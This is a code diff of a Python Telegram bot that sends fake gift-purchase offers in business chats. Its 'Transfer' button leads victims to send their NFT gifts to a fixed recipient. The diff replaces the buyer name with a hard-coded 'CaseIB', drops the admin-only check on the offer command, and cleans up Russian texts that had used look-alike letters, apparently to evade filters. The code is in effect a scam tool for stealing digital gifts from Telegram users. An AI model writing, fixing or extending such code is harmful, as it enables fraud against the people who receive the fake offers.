@@ -18,13 +18,14 @@ from aiogram.types import (
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=legitimy")
+NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=USERNAME")
 STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5242644275014951846")
 GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "5193179982775476271")
 CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
 CROSS_EMOJI_ID = os.getenv("CROSS_EMOJI_ID", "5778527486270770928")
 GIFT_EMOJI_ID = os.getenv("GIFT_EMOJI_ID", "5985472565508838112")
-ADMIN_ID = 8414654810
+
+BUYER_NAME = "CaseIB"
 
 if not BOT_TOKEN or ":" not in BOT_TOKEN:
     raise ValueError("BOT_TOKEN is required")
@@ -67,10 +68,6 @@ async def on_business_conn(conn: BusinessConnection):
     }
     save_connections()
     print(f"[BIZ] conn={conn.id} name={conn.user.first_name} @{conn.user.username}")
-
-def get_buyer_name(conn_id: str) -> str:
-    data = connections.get(conn_id, {})
-    return data.get("first_name") or "User"
 
 def format_amount(value: str) -> str:
     try:
@@ -177,12 +174,12 @@ def parse_nft_input(arg: str):
 
 TEXTS = {
     "ru": {
-        "offer_template": "Пользоватєль <b>{buyer}</b> предлагaєт Вам <b>{amount}</b> за подарок <b>{nft_link}.</b>",
-        "offer_expires": "Предложеніє действительнο єщё <b>5ч 59м.</b>",
+        "offer_template": "Пользователь <b>{buyer}</b> предлагает Вам <b>{amount}</b> за подарок <b>{nft_link}.</b>",
+        "offer_expires": "Предложение действует ещё <b>5ч 59м.</b>",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
         "btn_transfer": "Передать",
-        "declined": "Ви отклонili предложеніє",
+        "declined": "Вы отклонили предложение",
     },
     "us": {
         "offer_template": "User <b>{buyer}</b> offers You <b>{amount}</b> for gift <b>{nft_link}.</b>",
@@ -237,8 +234,6 @@ def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
 
 @dp.business_message(F.text.startswith("+rep "))
 async def cmd_rep_business(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        return
     args = message.text.split()
     if len(args) < 3:
         try:
@@ -281,7 +276,6 @@ async def cmd_rep_business(message: types.Message):
         "business_connection_id": message.business_connection_id,
         "chat_id": message.chat.id,
     }
-    buyer_name = get_buyer_name(message.business_connection_id)
     offer_text_raw = t['offer_template'].format(
         buyer="@@BUYER@@",
         amount="@@AMOUNT@@",
@@ -292,7 +286,7 @@ async def cmd_rep_business(message: types.Message):
     nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
     offer_text = (
         offer_text_rand
-        .replace("@@BUYER@@", buyer_name)
+        .replace("@@BUYER@@", BUYER_NAME)
         .replace("@@AMOUNT@@", f"{amount_formatted} {currency_text}")
         .replace("@@NFT@@", nft_link)
     )
